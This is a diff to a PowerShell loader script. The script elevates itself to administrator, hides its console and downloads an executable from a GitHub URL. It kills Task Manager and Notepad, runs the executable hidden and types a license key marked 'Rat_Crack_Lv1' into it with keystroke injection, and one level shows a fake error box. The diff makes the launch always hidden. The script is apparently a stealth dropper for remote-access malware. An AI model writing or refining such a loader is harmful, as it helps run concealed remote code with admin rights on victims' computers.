@@ -1,5 +1,5 @@
 # =====================================================
-# Self-Elevate (with GUI level selector)
+# Self-Elevate with GUI level selector
 # =====================================================
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
@@ -48,11 +48,11 @@ if (-not $isAdmin) {
 }
 
 # =====================================================
-# Now elevated, with the level passed as an argument
+# Elevated part – everything runs hidden from now on
 # =====================================================
 param([string]$level)
 
-# Hide current console
+# Hide the PowerShell console immediately
 $hwnd = (Get-Process -Id $pid).MainWindowHandle
 if ($hwnd -ne [IntPtr]::Zero) {
     Add-Type -TypeDefinition @"
@@ -66,7 +66,7 @@ public class Win32 {
     [Win32]::ShowWindow($hwnd, 0) | Out-Null
 }
 
-# Add Win32 API for window handling
+# Add Win32 API for window handling (to bring EXE to foreground if needed)
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
@@ -86,42 +86,31 @@ public class WindowAPI {
 # === Configuration ===
 $licenseKey = "Rat_Crack_Lv1"
 $exeUrl = "https://raw.githubusercontent.com/TSTEAM865/fafawfqf/main/cmd.exe"
+$mode = $level   # the mode to select (1-4)
 
-# The mode to select is the same as the blantant level
-$mode = $level   # 1-4
-
-# === Blantant level behavior (for window visibility, delays, etc.) ===
+# === Level-specific behavior (only affects delays and fake errors) ===
 switch ($level) {
     "1" {
-        $windowStyle = "Hidden"
         $delayBeforeSend = 1
-        $hideTargetAfterSend = $true
         $showFakeError = $false
     }
     "2" {
-        $windowStyle = "Hidden"
         $delayBeforeSend = 3
-        $hideTargetAfterSend = $true
         $showFakeError = $false
     }
     "3" {
-        $windowStyle = "Normal"
         $delayBeforeSend = 4
-        $hideTargetAfterSend = $true
         $showFakeError = $false
     }
     "4" {
-        $windowStyle = "Normal"
         $delayBeforeSend = 5
-        $hideTargetAfterSend = $false
         $showFakeError = $true
+        # Show a fake error message box (optional)
         Add-Type -AssemblyName System.Windows.Forms
         [System.Windows.Forms.MessageBox]::Show("An error occurred. Please restart the application.", "Error", "OK", "Error")
     }
     default {
-        $windowStyle = "Hidden"
         $delayBeforeSend = 3
-        $hideTargetAfterSend = $true
         $showFakeError = $false
     }
 }
@@ -146,7 +135,7 @@ try {
 }
 if (-not (Test-Path $exePath)) { exit 1 }
 
-# === Kill conflicts ===
+# === Kill potential conflicting processes ===
 foreach ($pName in @("taskmgr", "notepad")) {
     $procs = Get-Process -Name $pName -ErrorAction SilentlyContinue
     if ($procs) {
@@ -157,16 +146,13 @@ foreach ($pName in @("taskmgr", "notepad")) {
 }
 Start-Sleep -Milliseconds 500
 
-# === Launch EXE ===
-if ($windowStyle -eq "Hidden") {
-    $proc = Start-Process -FilePath $exePath -WindowStyle Hidden -PassThru
-} else {
-    $proc = Start-Process -FilePath $exePath -PassThru
-}
+# === Launch EXE HIDDEN (always) ===
+$proc = Start-Process -FilePath $exePath -WindowStyle Hidden -PassThru
 
+# Wait for the window to be ready (even though it's hidden, we need to send keys)
 Start-Sleep -Seconds $delayBeforeSend
 
-# === Find window and send license key ===
+# === Find the window handle (it's hidden, but we still need to focus it for SendKeys) ===
 $hwnd = $proc.MainWindowHandle
 if ($hwnd -eq [IntPtr]::Zero) {
     $hwnd = [WindowAPI]::FindWindow($null, "SKYNET - DEMOSHOP")
@@ -175,31 +161,30 @@ if ($hwnd -eq [IntPtr]::Zero) {
     }
 }
 
+# Even though it's hidden, we still need to bring it to foreground for SendKeys to work
 if ($hwnd -ne [IntPtr]::Zero) {
     [WindowAPI]::SetForegroundWindow($hwnd) | Out-Null
     [WindowAPI]::BringWindowToTop($hwnd) | Out-Null
     Start-Sleep -Milliseconds 500
 }
 
+# === Send license key ===
 Add-Type -AssemblyName System.Windows.Forms
-
-# Send the license key + Enter
 [System.Windows.Forms.SendKeys]::SendWait($licenseKey)
 [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
 
-# Wait for the menu to appear (the EXE validates and shows the mode selection)
+# Wait for the menu to appear
 Start-Sleep -Seconds 3
 
-# === Now send the mode selection (1-4) ===
-Write-Host "[+] Sending mode selection: $mode" -ForegroundColor Yellow
+# === Send mode selection (1-4) ===
 [System.Windows.Forms.SendKeys]::SendWait($mode)
 [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
 
-# If the EXE shows "Complete" / "Done" after selecting, we can wait a bit
+# Wait a bit for the EXE to finish
 Start-Sleep -Seconds 2
 
-# Optionally hide the window after everything
-if ($hideTargetAfterSend -and $hwnd -ne [IntPtr]::Zero) {
+# === Optionally hide the window (already hidden) – but just in case ===
+if ($hwnd -ne [IntPtr]::Zero) {
     [WindowAPI]::ShowWindow($hwnd, 0) | Out-Null
 }
 
